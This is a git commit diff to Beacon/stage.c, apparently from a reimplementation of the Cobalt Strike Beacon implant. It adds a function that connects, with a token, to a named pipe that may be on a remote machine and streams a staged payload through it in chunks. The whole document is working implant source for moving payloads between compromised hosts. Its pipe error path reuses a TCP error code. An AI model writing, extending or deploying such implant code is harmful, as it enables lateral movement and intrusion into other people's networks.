c53a1e55193dc2030b21e99bf0e47237e5a4239f
Javier <42473691+ElJaviLuki@users.noreply.github.com>
2024-01-27 00:12:20 +0100

    Implement StagePayloadViaPipe

--- Beacon/stage.c
+++ Beacon/stage.c
@@ -5,6 +5,7 @@
 #include "beacon.h"
 #include "link.h"
 #include "network.h"
+#include "pipe.h"
 
 int StagePayloadViaTcp(char* buffer, int length)
 {
@@ -32,9 +33,59 @@ int StagePayloadViaTcp(char* buffer, int length)
 	}
 
 	LERROR("Could not connect to target (stager)");
-	BeaconErrorNA(ERROR_STAGER_CONNECTION_FAILED);
+	BeaconErrorNA(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED);
 
 	waitAndClose:
 	Sleep(1000);
 	return closesocket(targetSocket);
+}
+
+void StagePayloadViaPipe(char* buffer, int length)
+{
+	char text[128];
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	BeaconDataStringCopySafe(&parser, text, sizeof(text));
+	char* data = BeaconDataBuffer(&parser);
+	int dataLength = BeaconDataLength(&parser);
+
+	HANDLE hFile;
+	int seconds = 0;
+	int timeout = GetTickCount() + 60000;
+	while(!PipeConnectWithToken(text, &hFile, 0))
+	{
+		if(GetLastError() == ERROR_BAD_NETPATH || GetTickCount() >= timeout)
+			goto error;
+
+		Sleep(1000);
+
+		if (++seconds >= 10)
+			goto error;
+	}
+
+	DWORD wrote;
+	WriteFile(hFile, &dataLength, sizeof(dataLength), &wrote, NULL);
+
+	int tmp = dataLength;
+	for(int total = 0; total < dataLength; total += wrote)
+	{
+		int toWrite = dataLength - total;
+		toWrite = min(toWrite, 0x2000);
+
+		if (!WriteFile(hFile, data + total, toWrite, &wrote, NULL))
+			break;	
+	}
+
+	FlushFileBuffers(hFile);
+	DisconnectNamedPipe(hFile);
+	CloseHandle(hFile);
+	Sleep(1000);
+
+	return;
+
+	error:
+	DWORD lastError = GetLastError();
+	LERROR("Could not connect to pipe (%s): %s", text, LAST_ERROR_STR(lastError));
+	BeaconErrorDS(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED, text, lastError);
 }
